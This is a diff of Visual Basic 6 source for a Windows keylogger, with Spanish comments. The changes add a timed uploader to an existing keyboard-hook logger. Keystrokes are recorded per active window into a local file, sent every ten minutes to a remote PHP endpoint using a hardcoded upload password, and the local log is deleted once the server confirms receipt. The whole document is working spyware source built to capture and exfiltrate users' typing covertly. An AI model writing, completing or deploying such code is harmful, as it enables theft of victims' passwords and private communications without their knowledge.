@@ -9,13 +9,26 @@ Begin VB.Form FrmMain
    ScaleHeight     =   4710
    ScaleWidth      =   7005
    StartUpPosition =   3  'Windows Default
+   Begin VB.Timer UploaderTimer 
+      Interval        =   60000
+      Left            =   1080
+      Top             =   2280
+   End
+   Begin VB.CommandButton Command2 
+      Caption         =   "Command2"
+      Height          =   435
+      Left            =   360
+      TabIndex        =   1
+      Top             =   240
+      Width           =   1215
+   End
    Begin VB.CommandButton Command1 
       Caption         =   "Hook"
-      Height          =   375
-      Left            =   3000
+      Height          =   495
+      Left            =   1800
       TabIndex        =   0
-      Top             =   360
-      Width           =   1215
+      Top             =   240
+      Width           =   1335
    End
 End
 Attribute VB_Name = "FrmMain"
@@ -46,33 +59,38 @@ Dim PressedAlt As Boolean
 Dim LastTimePressed As Date
 Dim Buffer As String, CntVbCrlF As Integer
 Dim VentanaActual As String
-
+Dim EnviarCada As Integer, cntMinutes As Integer
+ 
 Private Sub Command1_Click()
-    'SocketUpload.Connect "www.angelbroz.com", 80
-    MsgBox Asc("A"), , vbKeyA
+    Hook
+End Sub
+
+Private Sub Command2_Click()
+    UploadLogServer
 End Sub
 
 Private Sub Form_Load()
     Set MyEventRaiser = New EventRaiser
     Set SocketUpload = New CSocketMaster
-    UploadUrl = "http://www.angelbroz.com/kloggyx.php"
-
+    UploadUrl = "http://angelbroz.com/ab/k/kloggyx.php"
+    MyLogFile = "C:\status.akl"
+    EnviarCada = 10
+    'Este viene siendo el campo del archvio que recibimos en kloggyx.php
+    ServerUploadPassword = "abupload"
     Buffer = "                          [ Starting loggin at " & Now & "]"
     Save
     Buffer = ""
     LastTimePressed = Now
     CntVbCrlF = 1
 '    Hook
-    
 End Sub
 
 Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
     UnHook
 End Sub
 
-
-
 Private Sub MyEventRaiser_KBHKeyDown(ByVal vkCode As Integer, ByVal scanCode As Integer, ByVal flags As Integer)
+    On Error GoTo ErrHanlder
     Dim CurrentKeyboardState(0 To 255) As Byte
     Dim AsciiCode As Integer
     Dim LineaInicio As String
@@ -80,6 +98,10 @@ Private Sub MyEventRaiser_KBHKeyDown(ByVal vkCode As Integer, ByVal scanCode As 
     If Buffer = "" And VentanaActual <> ActiveWindow Then
         Buffer = LineaInicio
     ElseIf VentanaActual <> ActiveWindow Then
+        If Uploading Then
+            Buffer = Buffer & vbCrLf & LineaInicio
+            Exit Sub
+        End If
         Save
         Buffer = LineaInicio
         CntVbCrlF = 1
@@ -133,36 +155,71 @@ Private Sub MyEventRaiser_KBHKeyDown(ByVal vkCode As Integer, ByVal scanCode As 
     End If
     
     If s > 30 Or Len(Buffer) > 500 Then
+        If Uploading Then GoTo exitIf 'if the socket is uploading we cant clear the buffer
         Save
         Buffer = ""
         CntVbCrlF = 1
     End If
-       
+    
+exitIf:
     LastTimePressed = Now
     VentanaActual = ActiveWindow
-    Me.Caption = VentanaActual
+    Exit Sub
+ErrHanlder:
+    Me.MyEventRaiser.RaiseErrorDetected "Error al recibir el evento KBHKeyDown"
+    Err.Clear
 End Sub
 
 Private Sub MyEventRaiser_KBHKeyUp(ByVal vkCode As Integer, ByVal scanCode As Integer, ByVal flags As Integer)
+    On Error GoTo ErrHanlder
     'sin usarse, pero serviria para usar combinaciones de teclas, mas adelante vere que rollo
     Select Case vkCode
         Case vbKeyControl:                                  PressedControl = False
         Case vbKeyShift:                                    PressedShift = False
         Case OtrosVK.VK_Alt Or OtrosVK.VK_LAlt:             PressedAlt = False
     End Select
+    Exit Sub
+ErrHanlder:
+    Me.MyEventRaiser.RaiseErrorDetected "Error al recibir el evento KBHKeyDown"
+    Err.Clear
 End Sub
 
 Private Sub MyEventRaiser_ErrorDetected(ByVal ErrStr As String)
     On Error Resume Next ' <---- LOL!!! hahaha
     Dim tmpString As String
     tmpString = "[Error detected: " & Now & "ErrMsg:" & ErrStr & "]"
-    Open "C:\status.akl" For Append As #1
+    Open MyLogFile For Append As #1
         Print #1, tmpString
     Close #1
 End Sub
 
 Sub Save()
-    Open "C:\status.akl" For Append As #1
+    On Error Resume Next
+    Open MyLogFile For Append As #1
         Print #1, Buffer
     Close #1
+End Sub
+
+Private Sub SocketUpload_Connect()
+    Me.Caption = "connected"
+End Sub
+
+Private Sub SocketUpload_DataArrival(ByVal bytesTotal As Long)
+    On Error Resume Next
+    Dim Data As String
+    SocketUpload.GetData Data
+    If InStr(1, LCase(Data), "correcto") > 0 Then
+        Kill MyLogFile
+        Debug.Print "Borrado el log file :)"
+    End If
+End Sub
+
+
+Private Sub UploaderTimer_Timer()
+    'Entra cada minuto
+    cntMinutes = cntMinutes + 1
+    If cntMinutes = EnviarCada Then
+        UploadLogServer
+        cntMinutes = 0
+    End If
 End Sub
